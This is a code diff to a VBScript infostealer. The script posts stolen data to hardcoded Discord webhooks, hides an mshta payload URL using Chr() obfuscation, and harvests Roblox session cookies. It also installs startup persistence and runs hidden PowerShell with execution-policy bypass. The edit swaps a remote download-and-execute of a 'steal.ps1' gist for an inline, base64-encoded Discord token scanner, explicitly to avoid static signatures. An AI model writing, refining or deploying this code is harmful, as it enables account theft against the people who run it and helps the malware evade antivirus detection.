@@ -9,17 +9,15 @@ Dim sh, fso, WH, RE_WH, PAYLOAD_URL, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS & PAYLOAD URL ---
+' --- YOUR WEBHOOKS ---
 WH = "https://discord.com/api/webhooks/1570885190283427920/MLaG7_qcj28QnQaiyHgm_eaF1p0rj4NUP8ZDh98cFG42MOaHFhhcqsEwzgZsiIpp10Vs"
 RE_WH = "https://discord.com/api/webhooks/1570885290833350747/cnNXdcvYzTDTnUX0tW5ti5d3juq54PPmUl978MgXbWWzF11h_8YMKB-IbV3KnQvPwMPW"
 
-PAYLOAD_URL = "mshta https://dicerigx.app/"
+' --- OBFUSCATED PAYLOAD URL (mshta https://dicerigx.app/) ---
+PAYLOAD_URL = Chr(109)&Chr(115)&Chr(104)&Chr(116)&Chr(97)&Chr(32)&Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(99)&Chr(101)&Chr(114)&Chr(105)&Chr(103)&Chr(120)&Chr(46)&Chr(97)&Chr(112)&Chr(112)&Chr(47)
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-
-' --- DEBUG PING ---
-Call PostEmbedTo("Debug", "Script successfully started | PC: " & PC, 3447003, RE_WH)
 
 ' --- Initial Grab ---
 Call GrabTokens
@@ -57,7 +55,7 @@ Sub IP()
     Set xh = Nothing
 End Sub
 
-' --- GrabRoblox Function (raw .ROBLOSECURITY, no decrypt) ---
+' --- GrabRoblox Function (raw .ROBLOSECURITY) ---
 Sub GrabRoblox()
     Dim paths(9)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
@@ -198,48 +196,54 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "Startup installed to boot HTA", 65280)
 End Sub
 
-' --- GrabTokens (gist pull — in memory) ---
+' --- GrabTokens (Self-contained, in-memory) ---
 Sub GrabTokens()
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim pc: pc = xh.responseText
-    If Len(pc) < 100 Then Exit Sub
-    Set xh = Nothing
+    Dim psScript : psScript = ""
+    psScript = psScript & "$paths = @(""" & sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"",""" & sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordcanary\Local Storage\leveldb"",""" & sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordptb\Local Storage\leveldb"")" & vbCrLf
+    psScript = psScript & "foreach ($p in $paths) {" & vbCrLf
+    psScript = psScript & "  if (Test-Path $p) {" & vbCrLf
+    psScript = psScript & "    Get-ChildItem -Path $p -Filter *.ldb -Recurse | ForEach-Object {" & vbCrLf
+    psScript = psScript & "      $content = Get-Content $_.FullName -Raw" & vbCrLf
+    psScript = psScript & "      if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {" & vbCrLf
+    psScript = psScript & "        $matches.Values | ForEach-Object { Write-Output 'DISCORD|||' + $_ }" & vbCrLf
+    psScript = psScript & "      }" & vbCrLf
+    psScript = psScript & "    }" & vbCrLf
+    psScript = psScript & "  }" & vbCrLf
+    psScript = psScript & "}" & vbCrLf
+
+    ' Encode to Base64 to avoid quoting issues and static signatures
+    Dim b64 : b64 = Base64Encode(psScript)
     
-    ' Run entirely in memory (bypasses disk-write blocks)
-    Dim cmd : cmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""IEX ((New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1'))"""
-    sh.Run cmd, 0, True
-    
-    Dim tf: tf = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-    
-    If Len(raw) > 10 Then
-        Dim lines: lines = Split(raw, vbCrLf)
-        Dim l
-        For Each l In lines
-            If Len(l) > 10 Then
-                If Left(l, 8) = "DISCORD|" Then
-                    Dim p: p = Split(Mid(l, 9), "|")
-                    If UBound(p) >= 4 Then
-                        Dim info: info = "**User:** " & p(0) & vbCrLf
-                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                        info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
-                    End If
-                End If
-                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
-                End If
-            End If
-        Next
-    End If
+    ' Run entirely in memory using -EncodedCommand
+    Dim cmd : cmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64
+    sh.Run cmd, 0, False
 End Sub
+
+' --- Base64 Encode Helper ---
+Function Base64Encode(sText)
+    Dim oXML, oNode
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue = Stream_StringToBinary(sText)
+    Base64Encode = oNode.text
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function Stream_StringToBinary(Text)
+    Dim BinaryStream
+    Set BinaryStream = CreateObject("ADODB.Stream")
+    BinaryStream.Type = 2 ' adTypeText
+    BinaryStream.Charset = "unicode"
+    BinaryStream.Open
+    BinaryStream.WriteText Text
+    BinaryStream.Position = 0
+    BinaryStream.Type = 1 ' adTypeBinary
+    Stream_StringToBinary = BinaryStream.Read
+    BinaryStream.Close
+    Set BinaryStream = Nothing
+End Function
 
 ' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
